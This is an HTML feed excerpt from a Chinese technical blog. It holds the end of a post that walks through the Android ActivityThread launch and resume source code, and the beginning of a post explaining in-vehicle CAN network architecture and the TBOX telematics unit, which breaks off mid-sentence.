&amp;&amp; !r.startsNotResumed, r.lastProcessedSeq, reason);<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果失败或者其它原因就通知 activity manager 去stop activity.</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ActivityManagerNative</span>.getDefault()<br>                    .finishActivity(r.token, <span class="hljs-type">Activity</span>.<span class="hljs-type">RESULT_CANCELED</span>, <span class="hljs-literal">null</span>,<br>                            <span class="hljs-type">Activity</span>.<span class="hljs-type">DONT_FINISH_TASK_WITH_ACTIVITY</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-type">RemoteException</span> ex) &#123;<br>                <span class="hljs-keyword">throw</span> ex.rethrowFromSystemServer();<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里调用了两个关键方法</p><ul><li>performLaunchActivity</li><li>handleResumeActivity</li></ul><h4 id="4-4-29-AT-performLaunchActivity"><a href="#4-4-29-AT-performLaunchActivity" class="headerlink" title="4.4.29 AT.performLaunchActivity()"></a>4.4.29 AT.performLaunchActivity()</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">private</span> Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123;<br><br><span class="hljs-comment">//获取待启动的Activity的组件信息</span><br>        ActivityInfo aInfo = r.activityInfo;<br>        <span class="hljs-keyword">if</span> (r.packageInfo == <span class="hljs-literal">null</span>) &#123;<br>            r.packageInfo = getPackageInfo(aInfo.applicationInfo, r.compatInfo,<br>                    Context.CONTEXT_INCLUDE_CODE);<br>        &#125;<br>        ComponentName component = r.intent.getComponent();<br>        <span class="hljs-keyword">if</span> (component == <span class="hljs-literal">null</span>) &#123;<br>            component = r.intent.resolveActivity(<br>                mInitialApplication.getPackageManager());<br>            r.intent.setComponent(component);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (r.activityInfo.targetActivity != <span class="hljs-literal">null</span>) &#123;<br>            component = <span class="hljs-keyword">new</span> <span class="hljs-type">ComponentName</span>(r.activityInfo.packageName,<br>                    r.activityInfo.targetActivity);<br>        &#125;<br><br>        Activity activity = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//通过类加载器加载activity实例</span><br>            java.lang.ClassLoader cl = r.packageInfo.getClassLoader();<br>            activity = mInstrumentation.<span class="hljs-keyword">new</span><span class="hljs-type">Activity</span>(<br>                    cl, component.getClassName(), r.intent);<br>            StrictMode.incrementExpectedActivityCount(activity.getClass());<br>            r.intent.setExtrasClassLoader(cl);<br>            r.intent.prepareToEnterProcess();<br>            <span class="hljs-keyword">if</span> (r.state != <span class="hljs-literal">null</span>) &#123;<br>                r.state.setClassLoader(cl);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">if</span> (!mInstrumentation.onException(activity, e)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(<br>                    <span class="hljs-string">&quot;Unable to instantiate activity &quot;</span> + component<br>                    + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Application app = r.packageInfo.makeApplication(<span class="hljs-literal">false</span>, mInstrumentation);<br><br>            <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//创建该activity的context实例，实际类型是ContextImpl</span><br>                Context appContext = createBaseContextForActivity(r, activity);<br>                CharSequence title = r.activityInfo.loadLabel(appContext.getPackageManager());<br>                Configuration config = <span class="hljs-keyword">new</span> <span class="hljs-type">Configuration</span>(mCompatConfiguration);<br>                <span class="hljs-keyword">if</span> (r.overrideConfig != <span class="hljs-literal">null</span>) &#123;<br>                    config.updateFrom(r.overrideConfig);<br>                &#125;<br>                <br>                Window window = <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">if</span> (r.mPendingRemoveWindow != <span class="hljs-literal">null</span> &amp;&amp; r.mPreserveWindow) &#123;<br>                    window = r.mPendingRemoveWindow;<br>                    r.mPendingRemoveWindow = <span class="hljs-literal">null</span>;<br>                    r.mPendingRemoveWindowManager = <span class="hljs-literal">null</span>;<br>                &#125;<br>                <span class="hljs-comment">//在这个方法里关联context，并进行Activity一些初始化操作,</span><br>                <span class="hljs-comment">//比如完成Window的创建并建立自己和Window的关联</span><br>                <span class="hljs-comment">//这样当Window接收到外部输入事件后就可以将事件传递给Activity；</span><br>                <span class="hljs-comment">//维护一个Instrumentation引用</span><br>                activity.attach(appContext, <span class="hljs-built_in">this</span>, getInstrumentation(), r.token,<br>                        r.ident, app, r.intent, r.activityInfo, title, r.parent,<br>                        r.embeddedID, r.lastNonConfigurationInstances, config,<br>                        r.referrer, r.voiceInteractor, window);<br><br>                <span class="hljs-keyword">if</span> (customIntent != <span class="hljs-literal">null</span>) &#123;<br>                    activity.mIntent = customIntent;<br>                &#125;<br>                r.lastNonConfigurationInstances = <span class="hljs-literal">null</span>;<br>                activity.mStartedActivity = <span class="hljs-literal">false</span>;<br>                <span class="hljs-comment">//获取主题并设置</span><br>                int theme = r.activityInfo.getThemeResource();<br>                <span class="hljs-keyword">if</span> (theme != <span class="hljs-number">0</span>) &#123;<br>                    activity.setTheme(theme);<br>                &#125;<br><br><span class="hljs-comment">//回调activity的onCreate</span><br>                activity.mCalled = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">if</span> (r.isPersistable()) &#123;<br>                    mInstrumentation.callActivityOnCreate(activity, r.state, r.persistentState);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    mInstrumentation.callActivityOnCreate(activity, r.state);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!activity.mCalled) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">SuperNotCalledException</span>(<br>                        <span class="hljs-string">&quot;Activity &quot;</span> + r.intent.getComponent().toShortString() +<br>                        <span class="hljs-string">&quot; did not call through to super.onCreate()&quot;</span>);<br>                &#125;<br>                r.activity = activity;<br>                r.stopped = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">if</span> (!r.activity.mFinished) &#123;<br>                    activity.performStart();<br>                    r.stopped = <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!r.activity.mFinished) &#123;<br>                <span class="hljs-comment">//如果之前有保存数据，这里回调OnRestoreInstance</span><br>                    <span class="hljs-keyword">if</span> (r.isPersistable()) &#123;<br>                        <span class="hljs-keyword">if</span> (r.state != <span class="hljs-literal">null</span> || r.persistentState != <span class="hljs-literal">null</span>) &#123;<br>                            mInstrumentation.callActivityOnRestoreInstanceState(activity, r.state,<br>                                    r.persistentState);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (r.state != <span class="hljs-literal">null</span>) &#123;<br>                        mInstrumentation.callActivityOnRestoreInstanceState(activity, r.state);<br>                    &#125;<br>                &#125;<br>                <br>            &#125;<br>            r.paused = <span class="hljs-literal">true</span>;<br><br>            mActivities.put(r.token, r);<br><br>        &#125; <span class="hljs-keyword">catch</span> (SuperNotCalledException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">if</span> (!mInstrumentation.onException(activity, e)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(<br>                    <span class="hljs-string">&quot;Unable to start activity &quot;</span> + component<br>                    + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> activity;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-30-AT-handleResumeActivity"><a href="#4-4-30-AT-handleResumeActivity" class="headerlink" title="4.4.30 AT.handleResumeActivity()"></a>4.4.30 AT.handleResumeActivity()</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> handleResumeActivity(IBinder token,<br>            boolean clearHide, boolean isForward, boolean reallyResume, <span class="hljs-built_in">int</span> seq, <span class="hljs-built_in">String</span> reason) &#123;<br>        ActivityClientRecord r = mActivities.<span class="hljs-keyword">get</span>(token);<br>        <br>        ......<br>        <span class="hljs-comment">//见下方</span><br>        r = performResumeActivity(token, clearHide, reason);<br><br>        <span class="hljs-keyword">if</span> (r != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">final</span> Activity a = r.activity;<br><br>            <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> forwardBit = isForward ?<br>                    WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION : <span class="hljs-number">0</span>;<br><br>            <span class="hljs-comment">// 如果当前窗口没有添加到 window manager,并且它没有finished或者启动其它activity</span><br>            <span class="hljs-comment">// 那就继续添加到 window manager</span><br>            boolean willBeVisible = !a.mStartedActivity;<br>            <span class="hljs-keyword">if</span> (!willBeVisible) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    willBeVisible = ActivityManagerNative.getDefault().willActivityBeVisible(<br>                            a.getActivityToken());<br>                &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>                    <span class="hljs-keyword">throw</span> e.rethrowFromSystemServer();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (r.<span class="hljs-built_in">window</span> == <span class="hljs-keyword">null</span> &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) &#123;<br>                r.<span class="hljs-built_in">window</span> = r.activity.getWindow();<br>                View decor = r.<span class="hljs-built_in">window</span>.getDecorView();<br>                decor.setVisibility(View.INVISIBLE);<br>                ViewManager wm = a.getWindowManager();<br>                WindowManager.LayoutParams l = r.<span class="hljs-built_in">window</span>.getAttributes();<br>                a.mDecor = decor;<br>                l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION;<br>                l.softInputMode |= forwardBit;<br>                <span class="hljs-keyword">if</span> (r.mPreserveWindow) &#123;<br>                    a.mWindowAdded = <span class="hljs-keyword">true</span>;<br>                    r.mPreserveWindow = <span class="hljs-keyword">false</span>;<br>                    ViewRootImpl impl = decor.getViewRootImpl();<br>                    <span class="hljs-keyword">if</span> (impl != <span class="hljs-keyword">null</span>) &#123;<br>                        impl.notifyChildRebuilt();<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (a.mVisibleFromClient &amp;&amp; !a.mWindowAdded) &#123;<br>                    a.mWindowAdded = <span class="hljs-keyword">true</span>;<br>                    wm.addView(decor, l);<br>                &#125;<br><br>            <span class="hljs-comment">// 如果该窗口已经添加到了window manager，但是在resume期间，又启动了了一个activity</span><br>            <span class="hljs-comment">//那就设置窗口不可见</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!willBeVisible) &#123;<br>                r.hideForNow = <span class="hljs-keyword">true</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// Get rid of anything left hanging around.</span><br>            cleanUpPendingRemoveWindows(r, <span class="hljs-keyword">false</span> <span class="hljs-comment">/* force */</span>);<br><br>            <span class="hljs-comment">// 如果窗口已经添加，没有finish，没有启动其它activity，那窗口可见</span><br>            <span class="hljs-keyword">if</span> (!r.activity.mFinished &amp;&amp; willBeVisible<br>                    &amp;&amp; r.activity.mDecor != <span class="hljs-keyword">null</span> &amp;&amp; !r.hideForNow) &#123;<br>                <span class="hljs-keyword">if</span> (r.newConfig != <span class="hljs-keyword">null</span>) &#123;<br>                    performConfigurationChangedForActivity(r, r.newConfig, REPORT_TO_ACTIVITY);<br>                    r.newConfig = <span class="hljs-keyword">null</span>;<br>                &#125;<br>               <br>               <span class="hljs-comment">//设置输入框显示模式</span><br>                WindowManager.LayoutParams l = r.<span class="hljs-built_in">window</span>.getAttributes();<br>                <span class="hljs-keyword">if</span> ((l.softInputMode<br>                        &amp; WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION)<br>                        != forwardBit) &#123;<br>                    l.softInputMode = (l.softInputMode<br>                            &amp; (~WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION))<br>                            | forwardBit;<br>                    <span class="hljs-keyword">if</span> (r.activity.mVisibleFromClient) &#123;<br>                        ViewManager wm = a.getWindowManager();<br>                        View decor = r.<span class="hljs-built_in">window</span>.getDecorView();<br>                        wm.updateViewLayout(decor, l);<br>                    &#125;<br>                &#125;<br>                r.activity.mVisibleFromServer = <span class="hljs-keyword">true</span>;<br>                mNumVisibleActivities++;<br>                <span class="hljs-comment">//将当前activity视图设置可见</span><br>                <span class="hljs-keyword">if</span> (r.activity.mVisibleFromClient) &#123;<br>                    r.activity.makeVisible();<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 告诉 activity manager 该activity已经 resumed.</span><br>            <span class="hljs-keyword">if</span> (reallyResume) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    ActivityManagerNative.getDefault().activityResumed(token);<br>                &#125; <span class="hljs-keyword">catch</span> (RemoteException ex) &#123;<br>                    <span class="hljs-keyword">throw</span> ex.rethrowFromSystemServer();<br>                &#125;<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 当 resume 失败, 就结束这个activity</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                ActivityManagerNative.getDefault()<br>                    .finishActivity(token, Activity.RESULT_CANCELED, <span class="hljs-keyword">null</span>,<br>                            Activity.DONT_FINISH_TASK_WITH_ACTIVITY);<br>            &#125; <span class="hljs-keyword">catch</span> (RemoteException ex) &#123;<br>                <span class="hljs-keyword">throw</span> ex.rethrowFromSystemServer();<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-31-AT-performResumeActivity"><a href="#4-4-31-AT-performResumeActivity" class="headerlink" title="4.4.31 AT.performResumeActivity()"></a>4.4.31 AT.performResumeActivity()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ActivityClientRecord performResumeActivity(IBinder token,<br>            <span class="hljs-keyword">boolean</span> clearHide, <span class="hljs-keyword">String</span> reason) &#123;<br>        ActivityClientRecord r = mActivities.get(token);<br>        <br>        <span class="hljs-keyword">if</span> (r != <span class="hljs-literal">null</span> &amp;&amp; !r.activity.mFinished) &#123;<br>            <span class="hljs-keyword">if</span> (clearHide) &#123;<br>                r.hideForNow = <span class="hljs-literal">false</span>;<br>                r.activity.mStartedActivity = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                r.activity.onStateNotSaved();<br>                r.activity.mFragments.noteStateNotSaved();<br>                <span class="hljs-keyword">if</span> (r.pendingIntents != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//回调onNewIntent</span><br>                    deliverNewIntents(r, r.pendingIntents);<br>                    r.pendingIntents = <span class="hljs-literal">null</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (r.pendingResults != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//回调onActivityResult</span><br>                    deliverResults(r, r.pendingResults);<br>                    r.pendingResults = <span class="hljs-literal">null</span>;<br>                &#125;<br>                <span class="hljs-comment">//在这里相继回调onStart onResume</span><br>                r.activity.performResume();<br>......<br><br>                r.paused = <span class="hljs-literal">false</span>;<br>                r.stopped = <span class="hljs-literal">false</span>;<br>                r.state = <span class="hljs-literal">null</span>;<br>                r.persistentState = <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                <span class="hljs-keyword">if</span> (!mInstrumentation.onException(r.activity, e)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<br>                        <span class="hljs-string">&quot;Unable to resume activity &quot;</span><br>                        + r.intent.getComponent().toShortString()<br>                        + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br></code></pre></td></tr></table></figure><p>到这里一个Activity就从无到有被启动且可见了</p><h3 id="4-5-流程图"><a href="#4-5-流程图" class="headerlink" title="4.5 流程图"></a>4.5 流程图</h3> <img src="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" class=""><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/qq_30993595/article/details/82747738">从源码解析Android中Zygote进程是如何fork一个APP进程的</a></p><p><a href="https://blog.csdn.net/yiranfeng/article/details/103549394/">Android 10.0系统启动之init进程-[Android取经之路]</a></p><p><a href="https://blog.csdn.net/qq_30993595/article/details/82714409#t12">从源码解析-Android系统启动流程概述 init进程zygote进程SystemServer进程启动流程</a></p><p><a href="https://blog.csdn.net/yanzhenjie1003/article/details/95539904/">Android zygote 进程的启动过程分析</a></p><p><a href="https://www.jianshu.com/p/8a19c9ea2304">APP启动流程解析</a></p><p><a href="https://xyang.blog.csdn.net/article/details/82771691">ActivityThrad的工作逻辑</a></p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>车联网整车架构</title>
    <link href="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/"/>
    <url>/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="车机娱乐系统"><a href="#车机娱乐系统" class="headerlink" title="车机娱乐系统"></a>车机娱乐系统</h1><p>基本来说，当今的智能汽车基本有以下特点：</p><ol><li>基于操作系统，Android、Linux、yunos等</li><li>基本是虚拟按键</li><li>具备外网连接功能，即搭载Tbox盒子</li><li>有配套的车联网APP，可以远程当作手机钥匙和远程车控等功能</li><li>具备控制：空调、数字液晶仪、360环式摄像头、天窗、大灯的应用程序</li></ol><p>由上可知, 与车机娱乐系统互联且能在车机端直接控制的车内智能硬件有: 空调, 仪表, 360环视摄像头, 其他车身设备(天窗, 车窗, 大灯)这4类.</p><p>由以下拓扑图可知: </p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8B%93%E6%89%91%E5%9B%BE.png" class=""><ol><li>车机娱乐系统是ECAN上的一个节点，节点名称为VAES</li><li>空调时BCAN上的一个节点，名称为AC</li><li>仪表是ECAN上的节点，节点名称为IPK，也有叫ICU</li><li>360智能环视摄像头是BCAN上的节点，节点名称为AVM</li><li>其他车身设备（天窗、车窗、大灯）等设备是BCAN上的BCM节点统一管理</li></ol><p>所以车机娱乐系统就是整车CAN网络中的ECAN总线的一个节点，该节点一般叫VAES（Video Audio Entertainment System）。</p><p><strong>VAES(车机)节点订阅消息(接收): 车机就是一台显示器</strong></p><p>注:<em>ECU（电子控制单元）都是带EEPROM(可擦写可编程存储器)的, 基本上任何一次修改后, 都会在ECU内部做参数保存的</em></p><p><strong>场景一:</strong> </p><p>车机一开机, 自动显示上一次的空调状态.</p><p>比如空调是开启还是关闭状态, 车内温度, 空调风量, 运行模式是自动还是手动等, 即开机后, AC(空调)节点自动源源不断地发送自己的参数及状态信号,</p><p>以上信号经由网关转发并广播后, 被VAES(车机)节点订阅(接收)后显示在空调APP上。</p><p><strong>场景二:</strong></p><p>车机一开机, 自动显示上一次保存的大灯高度设置值</p><p>即开机后, BCM(天窗, 车窗, 大灯)节点自动源源不断地发送自己的参数及状态信号, 以上信号经由网关转发并广播后, 被VAES(车机)节点订阅(接收)后显示到车辆控制与设置界面.</p><p><strong>VAES(车机)节点发送消息: 车机就是一台远程控制器</strong></p><p><strong>场景一:</strong> </p><p>运行空调App, 比如手动调节到30度, 大风量, 以上信号由CAN网关转发并广播后, 最终被给AC(空调)节点订阅(接收)并成功解析后执行, 并在AC节点端保存以上设置数据.</p><p><strong>场景二:</strong> </p><p>点击车辆控制界面, 设置大灯设置信号, 比如我手动调节大灯高度或持续时间等, 以上信号会由CAN网关转发, 最终被BCM节点订阅(接收)并成功解析后执行, 并在BCM节点端保存以上设置.</p><p><strong>场景三:</strong> </p><p>智能液晶仪表tab切换显示, 比如从地图tab切到音乐tab, 以上信号直接传给IPK(仪表)节点进行解析执行并在IPK节点端保存以上设置. (由于仪表和车机同属于ECAN所以无需通过CAN网关转发, 可直接互传信号)</p><p><strong>场景四:</strong> </p><p>运行360环视App, 将自动打开所有4个方位的摄像头, 以上信号是先发给CAN网关, CAN网关广播后最终被AVM节点订阅后执行.</p><p>Q:车机节点是如何把原始CAN信号转成用户能够看得懂的文字或图像的呢.</p><p>A: 车机节点是车机上的一块MCU, 专门负责车机主机对整车CAN网络的CAN信号转换的, 业界一般用IPCL协议进行CAN信号到字符串信号(程序员能识别的信号)的转换, 以上字符串信号经过Carservice或App的解析后, 转成文字或者图像的界面供用户选择和使用。</p><h1 id="TBOX介绍"><a href="#TBOX介绍" class="headerlink" title="TBOX介绍"></a>TBOX介绍</h1><p>上一节 讲到了智能车载娱乐系统的5个基本特征:</p><p>基本来说, 当今的智能车机基本有以下几个特点:</p><ol><li>基于智能操作系统: Android, Yunos, Linux等</li><li>基本都是虚拟按键, 较少用实体按键</li><li>具备外网连接功能, 即搭载了Tbox盒子</li><li>有配套的车联网手机App, 具有手机钥匙及远程车控等功能</li><li>具备控制: 空调, 数字液晶仪表, 360度环视摄像头, 其他车身设备(天窗, 车窗, 大灯)的应用程序.</li></ol><p>以上涉及的第3点，第4点都必须有Tbox设备才能实现</p><p>Tbox是汽车上的一个盒子，其实是一个Android操作系统的带通讯功能的盒子，<br>内含一张SIM卡，一般是中国联通SIM卡，与这个盒子配套硬件还有GPS天线，4G天线等。<br>车机要联网必须有Tbox设备才能实现。</p><p>Tbox实例图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/tbox.png" class=""><p>TBOX的功能如下：</p><ol><li>Tbox可以给车机提供外网连接功能。</li></ol><p>如何提供外网, 原理很简单, 可以简单的把它当做是USB上网卡。</p><p>将这个接口接入自己的笔记本电脑, 在电脑网络连接那边就会多一个USB Ethernet的本地连接. 且确认过可以通过此连接成功上网.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/USBEthernet.png" class=""><ol start="2"><li><p>Tbox可以提供GPS定位服务。</p><p> Tbox有GPS天线接入，车机通过USB数据输出接口实时获取GPS定位信息。<br>(Tbox的USB接口，除了提供外网数据, 提供GPS数据外，开发人员还可以通过这个USB线进行Tbox开发及adb debug等。)</p><p>实车路试过程中, 只要把tbox的GPS天线接入接口拔掉, 整个车机的地图定位将完全废掉, 地图定位将出现各种飘…</p></li><li><p>Tbox是Diag CAN(诊断CAN)上的一个节点, 该节点可提供本地诊断和远程诊断等功能</p><p>一般地, 